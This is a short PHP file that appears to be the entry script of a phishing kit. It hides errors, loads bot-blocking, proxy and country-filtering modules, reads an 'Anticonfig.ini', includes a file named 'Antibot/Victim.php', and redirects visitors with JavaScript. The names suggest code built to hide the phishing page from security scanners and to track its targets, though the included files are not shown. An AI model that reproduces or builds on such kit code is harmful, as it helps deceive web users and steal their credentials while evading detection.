<?php
error_reporting(0);
require_once 'blocker.php';
require_once 'proxy.php';
require_once 'country.php';
$tanitatikaram = parse_ini_file("Anticonfig.ini", true);
require_once 'Antibot/Victim.php';
echo "<script>window.location.href = '../../';</script>";
?>